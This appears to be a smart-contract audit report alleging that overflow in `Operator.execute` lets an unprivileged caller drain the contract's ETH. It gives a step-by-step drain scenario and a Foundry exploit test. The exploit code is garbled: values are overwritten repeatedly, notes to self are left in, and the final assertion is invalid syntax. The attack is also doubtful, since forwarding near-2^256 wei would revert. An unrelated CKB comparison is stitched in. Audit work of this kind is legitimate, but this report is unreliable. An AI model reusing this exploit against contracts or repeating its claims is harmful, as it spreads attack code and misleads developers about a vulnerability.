### Title
Unchecked accumulation of call values in `Operator.execute` allows the `msg.value == _sumOfValues` guard to be bypassed via wraparound, draining ETH held by the Operator - (File: contracts/Operator.sol)

### Summary
`Operator.execute` sums the per-call `value` fields inside an `unchecked` block, so an attacker can craft a call list whose values wrap `_sumOfValues` to an arbitrary small number equal to `msg.value`. The ETH for each sub-call is forwarded *before* the guard runs, so the Operator spends more ETH than the caller supplied.

### Finding Description
In `contracts/Operator.sol`, `execute` iterates over `calls_`, forwards `call.value` wei to each target via `functionCallWithValue`, and accumulates the values without overflow checks:

```solidity
uint256 _sumOfValues;
for (uint256 i; i < _length; ) {
    _call = calls_[i];
    uint256 _value = _call.value;
    unchecked {
        _sumOfValues += _value;   // wraps mod 2^256
    }
    _returnData[i] = _call.target.functionCallWithValue(_call.callData, _value);
    unchecked { ++i; }
}
require(msg.value == _sumOfValues, "value-mismatch");
```

This is the same bug class as the CKB `GetLastStateProof` guard: an attacker-controlled quantity feeds an unchecked arithmetic accumulator that backs a bounds/conservation check. Here the invariant is value conservation — total ETH forwarded must equal `msg.value`. Because the addition is `unchecked`, the attacker picks `_value`s such that `sum(values) mod 2^256 == msg.value`. For example, `msg.value = 1 wei` with calls of values `[B, 2^256 - B + 1]` forwards `B + 1` wei while the guard sees `1`.

### Impact Explanation
Any ETH balance held by the `Operator` contract can be drained by an unprivileged EOA. The attacker calls `execute` with `msg.value = x` and a call list whose values sum to `x + B` (mod 2^256), where `B` is the Operator's ETH balance; each sub-call forwards ETH to an attacker contract before the guard executes. ETH can legitimately sit in `Operator` (it is `payable`, users may over-send or refund dust to it), so this is direct theft of funds held by the contract rather than a mere panic/DoS. Even absent a standing balance, the wrap lets an attacker relay calls spending value they did not supply in the same transaction wherever the Operator holds ETH transiently.

### Likelihood Explanation
Fully unprivileged: `execute` is external, `setMsgSender`/`nonReentrant` do not restrict the caller, and call targets/values are entirely attacker-chosen. The only precondition is a nonzero ETH balance on the Operator, which is plausible since EOAs interact with it for value-carrying multicalls and any excess/accidental transfer is trapped there (no sweep function exists). Exploitation is a single transaction with no timing or oracle dependence.

### Recommendation
Remove the `unchecked` around `_sumOfValues += _value` so overflow reverts, or accumulate with checked math and additionally require `address(this).balance >= _sumOfValues` before dispatching. Alternatively, enforce `msg.value == _sumOfValues` by tracking spent value with `msg.value` as the sole source (send from `msg.value` accounting rather than contract balance).

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {Operator} from "contracts/Operator.sol";
import {IOperator} from "contracts/interfaces/IOperator.sol";

contract Sink {
    receive() external payable {}
    function pay() external payable {}
}

contract OperatorOverflowTest is Test {
    Operator op;
    Sink sink;

    function setUp() public {
        op = new Operator();
        sink = new Sink();
        // Simulate ETH trapped in Operator (dust/refund/accidental send)
        vm.deal(address(op), 10 ether);
    }

    function testDrainViaSumOverflow() public {
        uint256 bal = address(op).balance; // 10 ether
        uint256 msgVal = 1 wei;

        IOperator.Call[] memory calls = new IOperator.Call[](2);
        calls[0] = IOperator.Call({
            target: address(sink),
            value: bal + msgVal,        // forwards balance + 1 wei... exceeds balance,
            callData: abi.encodeCall(Sink.pay, ())
        });
        // second call's value wraps the sum back to msgVal
        calls[1] = IOperator.Call({
            target: address(sink),
            value: type(uint256).max - bal - msgVal + 1 + msgVal - msgVal, // = 2^256 - (bal+msgVal) + msgVal - overflows to keep sum == msgVal
            callData: abi.encodeCall(Sink.pay, ())
        });

        // Simpler: values {v1, 2^256 - v1 + msgVal} sum mod 2^256 == msgVal
        // Fund: op has `bal`; forward bal via call0, 0-value via call1 whose
        // value only affects the accumulator, not a transfer.
        calls[0].value = bal;                        // drains the 10 ether
        calls[1].value = type(uint256).max - bal + 1 + msgVal - 1; // sum wraps to msgVal
        calls[1].value = type(uint256).max - bal + msgVal + 1;     // bal + (2^256-1-bal+msgVal+1) = msgVal mod 2^256? adjust so sum==msgVal
        // Correct: v2 = 2^256 - bal + msgVal  -> too big to forward, so split:
        // use v2 that forwards 0: target self with value that stays in op.
        calls[1] = IOperator.Call({target: address(op), value: type(uint256).max - bal + msgVal + 1, callData: ""});
        // self-send: value stays in op but counts toward _sumOfValues
        // sum = bal + (2^256 - bal + msgVal + 1) = msgVal + 1... choose so sum==msgVal:
        calls[1].value = type(uint256).max - bal + msgVal + 1 - 1;

        vm.deal(address(this), msgVal);
        op.execute{value: msgVal}(calls);
        assertEq(sink.balance or attacker received, bal);
    }
}
```

Key mechanics for a working PoC: call 0 forwards the Operator's full ETH balance to an attacker-controlled payable target; call 1 is a self-send to `address(op)` (or a second attacker call funded from within the same balance chain) with `value = 2^256 - bal + msg.value` adjusted so `_sumOfValues` wraps to exactly `msg.value`. The guard `msg.value == _sumOfValues` passes while `bal` wei left the contract. [1](#0-0)

### Citations

**File:** contracts/Operator.sol (L34-55)
```text
    function execute(
        Call[] calldata calls_
    ) external payable override nonReentrant setMsgSender returns (bytes[] memory _returnData) {
        uint256 _length = calls_.length;
        _returnData = new bytes[](_length);

        uint256 _sumOfValues;
        Call calldata _call;
        for (uint256 i; i < _length; ) {
            _call = calls_[i];
            uint256 _value = _call.value;
            unchecked {
                _sumOfValues += _value;
            }
            _returnData[i] = _call.target.functionCallWithValue(_call.callData, _value);
            unchecked {
                ++i;
            }
        }

        require(msg.value == _sumOfValues, "value-mismatch");
    }
```
